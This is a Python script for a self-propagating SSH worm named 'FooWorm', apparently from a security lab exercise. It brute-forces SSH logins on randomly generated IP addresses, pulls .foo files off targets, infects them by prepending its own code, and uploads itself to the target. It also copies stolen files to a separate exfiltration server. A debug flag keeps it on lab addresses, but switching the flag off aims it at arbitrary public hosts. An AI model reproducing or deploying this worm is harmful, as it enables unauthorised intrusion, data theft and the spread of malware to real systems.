#!/usr/bin/env python

import os
import sys
import random
import signal
import paramiko
import scp

# Signal handler setup
def sig_handler(signum, frame): os.kill(os.getpid(), signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1
NHOSTS = NUSERNAMES = NPASSWDS = 3

# [Your existing trigrams and digrams code remains the same]
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['seed']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['dees']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x: random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['10.0.2.10', '10.0.2.11']
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses

while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)
    
    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print(f"\n[+] Trying password {passwd} for user {user} at IP address: {ip_address}")
                files_of_interest_at_target = []
                ssh = None
                
                try:
                    print("[+] Establishing SSH connection...")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                    print("[+] SSH connection established")
                    
                    # Check if already infected
                    print("[+] Running initial 'ls' command...")
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        print(f"[!] Error in ls command: {error}")
                        continue
                        
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print(f"[+] Output of 'ls' command: {received_list}")
                    
                    if ''.join(str(received_list)).find('FooWorm') >= 0:
                        print("[!] Target already infected, skipping...")
                        continue
                    
                    # Find .foo files
                    print("[+] Looking for .foo files...")
                    cmd = 'ls *.foo 2>/dev/null || echo "No .foo files found"'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    
                    error = stderr.readlines()
                    if error:
                        print(f"[!] Error finding .foo files: {error}")
                        
                    received_list = list(map(lambda x: x.strip(), stdout.readlines()))
                    print(f"[+] Found .foo files: {received_list}")
                    
                    # Filter out "No .foo files found" message
                    if len(received_list) == 1 and "No .foo files found" in received_list[0]:
                        print("[!] No .foo files found on target")
                    else:
                        for item in received_list:
                            if item and item != "No .foo files found":
                                files_of_interest_at_target.append(item)
                    
                    print(f"[+] Files of interest: {files_of_interest_at_target}")
                    
                    IN = open("FooWorm.py",'r')
                    lines = IN.readlines()
                    virus = [line for (i, line) in enumerate(lines) if i<len(lines)]
                    IN.close()
                    
                    if files_of_interest_at_target:
                        # Download files from target
                        print("[+] Exfiltrating files from target...")
                        try:
                            scpcon = scp.SCPClient(ssh.get_transport())
                            for target_file in files_of_interest_at_target:
                                print(f"[+] Exfiltrating {target_file}...")
                                scpcon.get(target_file)
                                print(f"[+] Exfiltrated {target_file} successfully")
                        except Exception as e:
                            print(f"[!] SCP Exfiltration failed: {str(e)}")
                            
                        # Infect and upload files back
                        print("[+] Infecting and uploading files...")
                        try:
                            for target_file in files_of_interest_at_target:
                                print(f"[+] Processing {target_file}...")
                                # Read the file
                                IN = open(target_file,'r')
                                all_of_it = IN.readlines()
                                IN.close()
                                
                                # Check if already infected
                                if set((line.find('foovirus') for line in all_of_it)) == {-1}:
                                    print(f"[+] Infecting {target_file}...")
                                    # Infect the file
                                    OUT = open(target_file,'w')
                                    OUT.writelines(virus)
                                    all_of_it = ['#' + line for line in all_of_it]
                                    OUT.writelines(all_of_it)
                                    OUT.close()
                                    
                                    # Upload infected file back
                                    print(f"[+] Uploading infected {target_file}...")
                                    scpcon.put(target_file)
                                    print(f"[+] Uploaded infected {target_file}")
                                else:
                                    print(f"[+] File {target_file} already infected")
                            
                            # Upload worm
                            print("[+] Uploading FooWorm.py to target...")
                            scpcon.put(sys.argv[0])
                            print("[+] Worm uploaded successfully")
                            scpcon.close()
                        except Exception as e:
                            print(f"[!] Infection process failed: {str(e)}")
                except Exception as e:
                    print(f"[!] Connection failed: {str(e)}")
                    if ssh:
                        ssh.close()
                    continue
                
                # Exfiltrate files
                if files_of_interest_at_target:
                    print("[+] Attempting to exfiltrate files...")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        print("[+] Connecting to exfiltration server 10.0.2.9...")
                        ssh.connect('10.0.2.9', port=22, username='seed', password='dees', timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("[+] Connected to exfiltration server")
                        
                        for filename in files_of_interest_at_target:
                            print(f"[+] Exfiltrating {filename}...")
                            scpcon.put(filename)
                            print(f"[+] Exfiltrated {filename}")
                        
                        scpcon.close()
                        print("[+] Exfiltration complete")
                    except Exception as e:
                        print(f"[!] Exfiltration failed: {str(e)}")
                        continue
                else:
                    print("[!] No files to exfiltrate")
    
    if debug:
        print("[+] Debug mode - exiting after first run")
        break